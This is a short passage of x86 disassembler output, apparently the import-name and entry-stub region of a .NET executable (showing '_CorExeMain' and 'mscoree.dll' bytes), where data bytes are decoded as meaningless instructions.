  40cb31:	imul   esi,DWORD PTR [ecx+edi*2+0x2e],0x626470
	...
  40cbe9:	add    BYTE PTR [eax],al
  40cbeb:	add    BYTE PTR [esp+ecx*8],dl
	...
  40cbf6:	add    BYTE PTR [eax],al
  40cbf8:	cs int3 
  40cbfa:	add    BYTE PTR [eax],al
  40cbfc:	add    BYTE PTR [eax],ah
	...
  40cc12:	add    BYTE PTR [eax],al
  40cc14:	and    ah,cl
	...
  40cc22:	pop    edi
  40cc23:	inc    ebx
  40cc24:	outs   dx,DWORD PTR ds:[esi]
  40cc25:	jb     0x40cc6c
  40cc27:	js     0x40cc8e
  40cc29:	dec    ebp
  40cc2a:	popa   
  40cc2b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  40cc32:	jb     0x40cc99
  40cc34:	gs cs fs ins BYTE PTR es:[edi],dx
  40cc38:	ins    BYTE PTR es:[edi],dx
  40cc39:	add    BYTE PTR [eax],al
  40cc3b:	add    BYTE PTR [eax],al
  40cc3d:	add    bh,bh
  40cc3f:	and    eax,0x402000
